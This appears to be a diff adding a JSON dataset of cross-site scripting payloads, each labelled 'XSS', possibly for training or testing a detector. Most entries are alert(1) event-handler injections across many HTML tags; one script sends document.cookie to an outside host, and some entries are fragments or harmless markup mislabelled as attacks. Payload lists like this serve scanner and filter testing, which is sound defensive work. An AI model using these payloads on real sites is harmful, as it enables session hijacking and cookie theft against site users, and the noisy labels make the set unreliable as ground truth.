+{"payload": "<section onmouseup=\"alert(1)\">test</section>", "type": "XSS"}
+{"payload": "<style>@keyframes slidein {}</style><blink style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></blink>", "type": "XSS"}
+{"payload": "<font onmouseover=\"alert(1)\">test</font>", "type": "XSS"}
+{"payload": "<a onmouseenter=\"alert(1)\">test</a>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><strike style=\"animation-name:x\" onanimationend=\"alert(1)\"></strike>", "type": "XSS"}
+{"payload": "<html ontouchend=alert(1)>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><body style=\"animation-name:x\" onanimationstart=\"alert(1)\"></body>", "type": "XSS"}
+{"payload": "<style>@keyframes slidein {}</style><font style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></font>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><img style=\"animation-name:x\" onanimationstart=\"alert(1)\"></img>", "type": "XSS"}
+{"payload": "<dir onmouseout=\"alert(1)\">test</dir>", "type": "XSS"}
+{"payload": "<menuitem onblur=alert(1) tabindex=1 id=x></menuitem><input autofocus>", "type": "XSS"}
+{"payload": "<html draggable=\"true\" ondragstart=\"alert(1)\">test</html>", "type": "XSS"}
+{"payload": "<div oncut=\"alert(1)\" contenteditable>test</div>", "type": "XSS"}
+{"payload": "<span id=x tabindex=1 ondeactivate=alert(1)></span><input id=y autofocus>", "type": "XSS"}
+{"payload": "<div id=\"129\"><svg>", "type": "XSS"}
+{"payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><basefont id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></basefont>", "type": "XSS"}
+{"payload": "<font onclick=\"alert(1)\">test</font>", "type": "XSS"}
+{"payload": "<button onmouseout=\"alert(1)\">test</button>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><iframe style=\"animation-name:x\" onanimationstart=\"alert(1)\"></iframe>", "type": "XSS"}
+{"payload": "<dfn onbeforecut=\"alert(1)\" contenteditable>test</dfn>", "type": "XSS"}
+{"payload": "<rt id=x tabindex=1 onbeforedeactivate=alert(1)></rt><input autofocus>", "type": "XSS"}
+{"payload": "<div id=\"39\"><!-- up to Opera 11.52, FF 3.6.28 -->", "type": "XSS"}
+{"payload": "<select onbeforecopy=\"alert(1)\" contenteditable>test</select>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><summary style=\"animation-name:x\" onanimationstart=\"alert(1)\"></summary>", "type": "XSS"}
+{"payload": "<progress onpaste=\"alert(1)\" contenteditable>test</progress>", "type": "XSS"}
+{"payload": "<rt onmousedown=\"alert(1)\">test</rt>", "type": "XSS"}
+{"payload": "<object onmouseenter=\"alert(1)\">test</object>", "type": "XSS"}
+{"payload": "<applet id=x tabindex=1 onbeforeactivate=alert(1)></applet>", "type": "XSS"}
+{"payload": "<audio oncontextmenu=\"alert(1)\">test</audio>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><td style=\"animation-name:x\" onanimationend=\"alert(1)\"></td>", "type": "XSS"}
+{"payload": "<blockquote onmouseup=\"alert(1)\">test</blockquote>", "type": "XSS"}
+{"payload": "<style>@keyframes slidein {}</style><rtc style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></rtc>", "type": "XSS"}
+{"payload": "<source id=x tabindex=1 onbeforeactivate=alert(1)></source>", "type": "XSS"}
+{"payload": "<style>:target {color:red;}</style><var id=x style=\"transition:color 1s\" ontransitionend=alert(1)></var>", "type": "XSS"}
+{"payload": "<dir draggable=\"true\" ondragstart=\"alert(1)\">test</dir>", "type": "XSS"}
+{"payload": "?userDefined=');function someFunction(a){}alert(1)//\",", "type": "XSS"}
+{"payload": "<h1 onpaste=\"alert(1)\" contenteditable>test</h1>", "type": "XSS"}
+{"payload": "<style>:target {color:red;}</style><rp id=x style=\"transition:color 1s\" ontransitionend=alert(1)></rp>", "type": "XSS"}
+{"payload": "<style>:target {transform: rotate(180deg);}</style><hgroup id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></hgroup>", "type": "XSS"}
+{"payload": "<style onreadystatechange=alert(1)></style>", "type": "XSS"}
+{"payload": "<svg onload=(alert)(1) >//INJECTX", "type": "XSS"}
+{"payload": "<i onkeyup=\"alert(1)\" contenteditable>test</i>", "type": "XSS"}
+{"payload": "<link onbeforecopy=\"alert(1)\" contenteditable>test</link>", "type": "XSS"}
+{"payload": "\">", "type": "XSS"}
+{"payload": "<center id=x tabindex=1 onactivate=alert(1)></center>", "type": "XSS"}
+{"payload": "<form id=x tabindex=1 ondeactivate=alert(1)></form><input id=y autofocus>", "type": "XSS"}
+{"payload": "<output id=x tabindex=1 onfocus=alert(1)></output>", "type": "XSS"}
+{"payload": "<script>alert(1)//", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><details style=\"animation-name:x\" onanimationend=\"alert(1)\"></details>", "type": "XSS"}
+{"payload": "<small onblur=alert(1) tabindex=1 id=x></small><input autofocus>", "type": "XSS"}
+{"payload": "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">", "type": "XSS"}
+{"payload": "<footer onmouseup=\"alert(1)\">test</footer>", "type": "XSS"}
+{"payload": "<noembed onmousemove=\"alert(1)\">test</noembed>", "type": "XSS"}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><acronym ondragover=alert(1) contenteditable>drop here</acronym>", "type": "XSS"}
+{"payload": "<var ondblclick=\"alert(1)\">test</var>", "type": "XSS"}
+{"payload": "<style>:target {transform: rotate(180deg);}</style><canvas id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></canvas>", "type": "XSS"}
+{"payload": "<iframe width=\"420\" height=\"315\" src=\"https://www.youtube.com/embed/iUXAHc-ABoY?autoplay=1\" frameborder=\"0\" allowfullscreen></iframe>", "type": "XSS"}
+{"payload": "<strike onpaste=\"alert(1)\" contenteditable>test</strike>", "type": "XSS"}
+{"payload": "<button onpaste=\"alert(1)\" contenteditable>test</button>", "type": "XSS"}
+{"payload": "<tbody oncopy=\"alert(1)\" contenteditable>test</tbody>", "type": "XSS"}
+{"payload": "<tbody id=x tabindex=1 onfocusin=alert(1)></tbody>", "type": "XSS"}
+{"payload": "<q onclick=\"alert(1)\">test</q>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><caption style=\"animation-name:x\" onanimationstart=\"alert(1)\"></caption>", "type": "XSS"}
+{"payload": "<map draggable=\"true\" ondragleave=\"alert(1)\">test</map>", "type": "XSS"}
+{"payload": "<style>:target {color:red;}</style><param id=x style=\"transition:color 1s\" ontransitionend=alert(1)></param>", "type": "XSS"}
+{"payload": "<style>:target {transform: rotate(180deg);}</style><dl id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></dl>", "type": "XSS"}
+{"payload": "<map onmouseover=\"alert(1)\">test</map>", "type": "XSS"}
+{"payload": "<base id=x tabindex=1 onbeforedeactivate=alert(1)></base><input autofocus>", "type": "XSS"}
+{"payload": "<img src=https://crowdshield.com/.testing/xss.png onerror=prompt(13) onload=prompt(14) onmouseover=prompt(15)>//INJECTX REMOTE", "type": "XSS"}
+{"payload": "<image onmousemove=\"alert(1)\">test</image>", "type": "XSS"}
+{"payload": "<xmp onmouseenter=\"alert(1)\">test</xmp>", "type": "XSS"}
+{"payload": "<i onblur=alert(1) tabindex=1 id=x></i><input autofocus>", "type": "XSS"}
+{"payload": "<source id=x tabindex=1 onactivate=alert(1)></source>", "type": "XSS"}
+{"payload": "<figcaption id=x tabindex=1 onfocus=alert(1)></figcaption>", "type": "XSS"}
+{"payload": "<video onmouseup=\"alert(1)\">test</video>", "type": "XSS"}
+{"payload": "<picture><source srcset=\"validimage.png\"><img onload=alert(1)></picture>", "type": "XSS"}
+{"payload": "<object draggable=\"true\" ondragend=\"alert(1)\">test</object>", "type": "XSS"}
+{"payload": "<link onblur=alert(1) tabindex=1 id=x></link><input autofocus>", "type": "XSS"}
+{"payload": "<style>:target {color:red;}</style><bgsound id=x style=\"transition:color 1s\" ontransitionend=alert(1)></bgsound>", "type": "XSS"}
+{"payload": "<rb oncopy=\"alert(1)\" contenteditable>test</rb>", "type": "XSS"}
+{"payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><li id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></li>", "type": "XSS"}
+{"payload": "?goto,javascript:alert(1)\",", "type": "XSS"}
+{"payload": "<optgroup onmouseleave=\"alert(1)\">test</optgroup>", "type": "XSS"}
+{"payload": "<multicol oncopy=\"alert(1)\" contenteditable>test</multicol>", "type": "XSS"}
+{"payload": "<div oncopy=\"alert(1)\" contenteditable>test</div>", "type": "XSS"}
+{"payload": "<area id=x tabindex=1 ondeactivate=alert(1)></area><input id=y autofocus>", "type": "XSS"}
+{"payload": "<dialog draggable=\"true\" ondragenter=\"alert(1)\">test</dialog>", "type": "XSS"}
+{"payload": "<address onmouseout=\"alert(1)\">test</address>", "type": "XSS"}
+{"payload": "<style>@keyframes slidein {}</style><body style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></body>", "type": "XSS"}
+{"payload": "<picture draggable=\"true\" ondragstart=\"alert(1)\">test</picture>", "type": "XSS"}
+{"payload": "<x oncontextmenu=alert(1)>right click this!", "type": "XSS"}
+{"payload": "<marguee/onstart=alert(1)>", "type": "XSS"}
+{"payload": "<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>", "type": "XSS"}
+{"payload": "<br draggable=\"true\" ondragenter=\"alert(1)\">test</br>", "type": "XSS"}
+{"payload": "<iframe onmouseout=\"alert(1)\">test</iframe>", "type": "XSS"}
+{"payload": "<figure draggable=\"true\" ondragstart=\"alert(1)\">test</figure>", "type": "XSS"}
+{"payload": "<h1 onmouseout=\"alert(1)\">test</h1>", "type": "XSS"}
+{"payload": "<map id=x tabindex=1 onfocus=alert(1)></map>", "type": "XSS"}
+{"payload": "' onmouseover=alert(/XSS/)", "type": "XSS"}
+{"payload": "<svg><dfn onload=alert(1)></dfn>", "type": "XSS"}
+{"payload": "<plaintext id=x tabindex=1 onfocusin=alert(1)></plaintext>", "type": "XSS"}
+{"payload": "<code onfocusout=alert(1) tabindex=1 id=x></code><input autofocus>", "type": "XSS"}
+{"payload": "<a onpaste=\"alert(1)\" contenteditable>test</a>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><tt style=\"animation-name:x\" onanimationstart=\"alert(1)\"></tt>", "type": "XSS"}
+{"payload": "<frame draggable=\"true\" ondragleave=\"alert(1)\">test</frame>", "type": "XSS"}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><ul ondragover=alert(1) contenteditable>drop here</ul>", "type": "XSS"}
+{"payload": "<video autoplay onplay=alert(1)><source src=\"validvideo.mp4\" type=\"video/mp4\"></video>", "type": "XSS"}
+{"payload": "<textarea draggable=\"true\" ondragleave=\"alert(1)\">test</textarea>", "type": "XSS"}
+{"payload": "<samp draggable=\"true\" ondragenter=\"alert(1)\">test</samp>", "type": "XSS"}
+{"payload": "<track onclick=\"alert(1)\">test</track>", "type": "XSS"}
+{"payload": "<menuitem onmousedown=\"alert(1)\">test</menuitem>", "type": "XSS"}
+{"payload": "<big id=x tabindex=1 onbeforeactivate=alert(1)></big>", "type": "XSS"}
+{"payload": "<frameset onkeyup=\"alert(1)\" contenteditable>test</frameset>", "type": "XSS"}
+{"payload": "<video onbeforecopy=\"alert(1)\" contenteditable>test</video>", "type": "XSS"}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><legend ondragover=alert(1) contenteditable>drop here</legend>", "type": "XSS"}
+{"payload": "<frame onclick=\"alert(1)\">test</frame>", "type": "XSS"}
+{"payload": "<element oncopy=\"alert(1)\" contenteditable>test</element>", "type": "XSS"}
+{"payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><aside id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></aside>", "type": "XSS"}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><tbody ondrop=alert(1) contenteditable>drop here</tbody>", "type": "XSS"}
+{"payload": "<!DOCTYPE doc [", "type": "XSS"}
+{"payload": "<style>:target {transform: rotate(180deg);}</style><video id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></video>", "type": "XSS"}
+{"payload": "<canvas id=x tabindex=1 onfocusin=alert(1)></canvas>", "type": "XSS"}
+{"payload": "<bdi onmouseout=\"alert(1)\">test</bdi>", "type": "XSS"}
+{"payload": "<sub oncontextmenu=\"alert(1)\">test</sub>", "type": "XSS"}
+{"payload": "<output onmouseout=\"alert(1)\">test</output>", "type": "XSS"}
+{"payload": "<output onmousedown=\"alert(1)\">test</output>", "type": "XSS"}
+{"payload": "<style>:target {transform: rotate(180deg);}</style><area id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></area>", "type": "XSS"}
+{"payload": "<content draggable=\"true\" ondrag=\"alert(1)\">test</content>", "type": "XSS"}
+{"payload": "<q onmouseleave=\"alert(1)\">test</q>", "type": "XSS"}
+{"payload": "<p onmouseout=\"alert(1)\">test</p>", "type": "XSS"}
+{"payload": "<style>@keyframes slidein {}</style><object style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></object>", "type": "XSS"}
+{"payload": "<svg><u onload=alert(1)></u>", "type": "XSS"}
+{"payload": "<svg><audio onload=alert(1)></audio>", "type": "XSS"}
+{"payload": "<embed src=/ onload=alert(1)>", "type": "XSS"}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><address ondrop=alert(1) contenteditable>drop here</address>", "type": "XSS"}
+{"payload": "<s id=x tabindex=1 onbeforedeactivate=alert(1)></s><input autofocus>", "type": "XSS"}
+{"payload": "<acronym onmousemove=\"alert(1)\">test</acronym>", "type": "XSS"}
+{"payload": "<listing onbeforecopy=\"alert(1)\" contenteditable>test</listing>", "type": "XSS"}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><ol ondrop=alert(1) contenteditable>drop here</ol>", "type": "XSS"}
+{"payload": "<li draggable=\"true\" ondrag=\"alert(1)\">test</li>", "type": "XSS"}
+{"payload": "<content draggable=\"true\" ondragend=\"alert(1)\">test</content>", "type": "XSS"}
+{"payload": "<style>@keyframes slidein {}</style><meta style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></meta>", "type": "XSS"}
+{"payload": "<input autofocus onfocusin=alert(1)>", "type": "XSS"}
+{"payload": "<head id=x tabindex=1 onactivate=alert(1)></head>", "type": "XSS"}
+{"payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><script id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></script>", "type": "XSS"}
+{"payload": "<meter onpaste=\"alert(1)\" contenteditable>test</meter>", "type": "XSS"}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><select ondragover=alert(1) contenteditable>drop here</select>", "type": "XSS"}
+{"payload": "<thead onclick=\"alert(1)\">test</thead>", "type": "XSS"}
+{"payload": "<optgroup id=x tabindex=1 onbeforedeactivate=alert(1)></optgroup><input autofocus>", "type": "XSS"}
+{"payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><big id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></big>", "type": "XSS"}
+{"payload": "<style>:target {color:red;}</style><table id=x style=\"transition:color 1s\" ontransitionend=alert(1)></table>", "type": "XSS"}
+{"payload": "<audio draggable=\"true\" ondragleave=\"alert(1)\">test</audio>", "type": "XSS"}
+{"payload": "<embed onkeypress=\"alert(1)\" contenteditable>test</embed>", "type": "XSS"}
+{"payload": "<script> document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click({'type':'click','isTrusted':true}); </script>", "type": "XSS"}
+{"payload": "<svg><data onload=alert(1)></data>", "type": "XSS"}
+{"payload": "<i onmouseup=\"alert(1)\">test</i>", "type": "XSS"}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><cite ondragover=alert(1) contenteditable>drop here</cite>", "type": "XSS"}
+{"payload": "<table draggable=\"true\" ondrag=\"alert(1)\">test</table>", "type": "XSS"}
+{"payload": "<time onfocusout=alert(1) tabindex=1 id=x></time><input autofocus>", "type": "XSS"}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><iframe ondrop=alert(1) contenteditable>drop here</iframe>", "type": "XSS"}
+{"payload": "<html ontouchstart=alert(1)>", "type": "XSS"}
+{"payload": "<font onmouseup=\"alert(1)\">test</font>", "type": "XSS"}
+{"payload": "<legend id=x tabindex=1 onfocus=alert(1)></legend>", "type": "XSS"}
+{"payload": "<li onmousedown=\"alert(1)\">test</li>", "type": "XSS"}
+{"payload": "navigator.vibrate(500)", "type": "XSS"}
+{"payload": "<input type=\"submit\">", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><tt style=\"animation-name:x\" onanimationend=\"alert(1)\"></tt>", "type": "XSS"}
+{"payload": "<b onmouseenter=\"alert(1)\">test</b>", "type": "XSS"}
+{"payload": "<p onmousedown=\"alert(1)\">test</p>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><link style=\"animation-name:x\" onanimationend=\"alert(1)\"></link>", "type": "XSS"}
+{"payload": "<optgroup onbeforecopy=\"alert(1)\" contenteditable>test</optgroup>", "type": "XSS"}
+{"payload": "<style>:target {color:red;}</style><dt id=x style=\"transition:color 1s\" ontransitionend=alert(1)></dt>", "type": "XSS"}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><a ondragover=alert(1) contenteditable>drop here</a>", "type": "XSS"}
+{"payload": "<picture ondblclick=\"alert(1)\">test</picture>", "type": "XSS"}
+{"payload": "<b onblur=alert(1) tabindex=1 id=x></b><input autofocus>", "type": "XSS"}
+{"payload": "<track onmouseover=\"alert(1)\">test</track>", "type": "XSS"}
+{"payload": "onmouseover=", "type": "XSS"}
+{"payload": "<input id=x tabindex=1 onbeforeactivate=alert(1)></input>", "type": "XSS"}
+{"payload": "<spacer draggable=\"true\" ondragleave=\"alert(1)\">test</spacer>", "type": "XSS"}
+{"payload": "<applet onclick=\"alert(1)\">test</applet>", "type": "XSS"}
+{"payload": "<center draggable=\"true\" ondrag=\"alert(1)\">test</center>", "type": "XSS"}
+{"payload": "<img usemap=#x><map name=\"x\"><area href onfocus=alert(1) id=x>", "type": "XSS"}
+{"payload": "<plaintext draggable=\"true\" ondragstart=\"alert(1)\">test</plaintext>", "type": "XSS"}
+{"payload": "<tfoot onmouseover=\"alert(1)\">test</tfoot>", "type": "XSS"}
+{"payload": "<br onfocusout=alert(1) tabindex=1 id=x></br><input autofocus>", "type": "XSS"}
+{"payload": "<command onmouseleave=\"alert(1)\">test</command>", "type": "XSS"}
+{"payload": "<main id=x tabindex=1 onfocus=alert(1)></main>", "type": "XSS"}
+{"payload": "<acronym oncontextmenu=\"alert(1)\">test</acronym>", "type": "XSS"}
+{"payload": "<image onmouseleave=\"alert(1)\">test</image>", "type": "XSS"}
+{"payload": "<img onblur=alert(1) tabindex=1 id=x></img><input autofocus>", "type": "XSS"}
+{"payload": "<slot onbeforecut=\"alert(1)\" contenteditable>test</slot>", "type": "XSS"}
+{"payload": "<output draggable=\"true\" ondragleave=\"alert(1)\">test</output>", "type": "XSS"}
+{"payload": "<i id=x tabindex=1 ondeactivate=alert(1)></i><input id=y autofocus>", "type": "XSS"}
+{"payload": "<ul onblur=alert(1) tabindex=1 id=x></ul><input autofocus>", "type": "XSS"}
+{"payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><pre id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></pre>", "type": "XSS"}
+{"payload": "<marquee onblur=alert(1) tabindex=1 id=x></marquee><input autofocus>", "type": "XSS"}
+{"payload": "<strong draggable=\"true\" ondragleave=\"alert(1)\">test</strong>", "type": "XSS"}
+{"payload": "<button id=x tabindex=1 onbeforeactivate=alert(1)></button>", "type": "XSS"}
+{"payload": "<slot draggable=\"true\" ondragend=\"alert(1)\">test</slot>", "type": "XSS"}
+{"payload": "<ruby oncopy=\"alert(1)\" contenteditable>test</ruby>", "type": "XSS"}
+{"payload": "<rect  fill=\"white\" style=\"clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);\"/>", "type": "XSS"}
+{"payload": "<SCRIPT>a=/XSS/", "type": "XSS"}
+{"payload": "<p onmouseenter=\"alert(1)\">test</p>", "type": "XSS"}
+{"payload": "<tfoot onkeyup=\"alert(1)\" contenteditable>test</tfoot>", "type": "XSS"}
+{"payload": "<acronym onbeforepaste=\"alert(1)\" contenteditable>test</acronym>", "type": "XSS"}
+{"payload": "<p onkeyup=\"alert(1)\" contenteditable>test</p>", "type": "XSS"}
+{"payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><b id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></b>", "type": "XSS"}
+{"payload": "<option ondblclick=\"alert(1)\">test</option>", "type": "XSS"}
+{"payload": "<strong onmouseenter=\"alert(1)\">test</strong>", "type": "XSS"}
+{"payload": "<marquee loop=1 width=0 onfinish=alert(1)>", "type": "XSS"}
+{"payload": "<spacer onmouseover=\"alert(1)\">test</spacer>", "type": "XSS"}
+{"payload": "<xmp onblur=alert(1) tabindex=1 id=x></xmp><input autofocus>", "type": "XSS"}
+{"payload": "<track onkeypress=\"alert(1)\" contenteditable>test</track>", "type": "XSS"}
+{"payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rb id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></rb>", "type": "XSS"}
+{"payload": "<style>@keyframes slidein {}</style><tr style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></tr>", "type": "XSS"}
+{"payload": "<tbody onmouseenter=\"alert(1)\">test</tbody>", "type": "XSS"}
+{"payload": "<wbr id=x tabindex=1 ondeactivate=alert(1)></wbr><input id=y autofocus>", "type": "XSS"}
+{"payload": "<mark draggable=\"true\" ondrag=\"alert(1)\">test</mark>", "type": "XSS"}
+{"payload": "<strike oncopy=\"alert(1)\" contenteditable>test</strike>", "type": "XSS"}
+{"payload": "<noembed id=x tabindex=1 onactivate=alert(1)></noembed>", "type": "XSS"}
+{"payload": "<command oncut=\"alert(1)\" contenteditable>test</command>", "type": "XSS"}
+{"payload": "<style>@keyframes slidein {}</style><applet style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></applet>", "type": "XSS"}
+{"payload": "<wbr oncopy=\"alert(1)\" contenteditable>test</wbr>", "type": "XSS"}
+{"payload": "<rt oncut=\"alert(1)\" contenteditable>test</rt>", "type": "XSS"}
+{"payload": "<section onblur=alert(1) tabindex=1 id=x></section><input autofocus>", "type": "XSS"}
+{"payload": "<rt draggable=\"true\" ondragenter=\"alert(1)\">test</rt>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><cite style=\"animation-name:x\" onanimationend=\"alert(1)\"></cite>", "type": "XSS"}
+{"payload": "<svg><hr onload=alert(1)></hr>", "type": "XSS"}
+{"payload": "<table id=x tabindex=1 onfocus=alert(1)></table>", "type": "XSS"}
+{"payload": "<style>@keyframes x{}</style><select style=\"animation-name:x\" onanimationend=\"alert(1)\"></select>", "type": "XSS"}
+{"payload": "<html draggable=\"true\" ondragenter=\"alert(1)\">test</html>", "type": "XSS"}
+{"payload": "<em oncontextmenu=\"alert(1)\">test</em>", "type": "XSS"}
+{"payload": "<canvas onmouseover=\"alert(1)\">test</canvas>", "type": "XSS"}
+{"payload": "<dt onkeyup=\"alert(1)\" contenteditable>test</dt>", "type": "XSS"}
+{"payload": "<keygen onmouseenter=\"alert(1)\">test</keygen>", "type": "XSS"}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><marquee ondragover=alert(1) contenteditable>drop here</marquee>", "type": "XSS"}
+{"payload": "<em onmousedown=\"alert(1)\">test</em>", "type": "XSS"}
+{"payload": "<dt onpaste=\"alert(1)\" contenteditable>test</dt>", "type": "XSS"}
+{"payload": "<script draggable=\"true\" ondragend=\"alert(1)\">test</script>", "type": "XSS"}
+{"payload": "<style>:target {color:red;}</style><h1 id=x style=\"transition:color 1s\" ontransitionend=alert(1)></h1>", "type": "XSS"}
+{"payload": "<th ondblclick=\"alert(1)\">test</th>", "type": "XSS"}
+{"payload": "<script>location.href='http://sn1persecurity.com/.testing/iframe_injection.php?'+document.cookie;</script>//INJECTX", "type": "XSS"}
+{"payload": "<param id=x tabindex=1 onfocusin=alert(1)></param>", "type": "XSS"}
+{"payload": "<code onbeforecut=\"alert(1)\" contenteditable>test</code>", "type": "XSS"}
+{"payload": "<style>:target {transform: rotate(180deg);}</style><object id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></object>", "type": "XSS"}
+{"payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><summary id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></summary>", "type": "XSS"}
+{"payload": "<td onblur=alert(1) tabindex=1 id=x></td><input autofocus>", "type": "XSS"}
+{"payload": "<img draggable=\"true\" ondragend=\"alert(1)\">test</img>", "type": "XSS"}
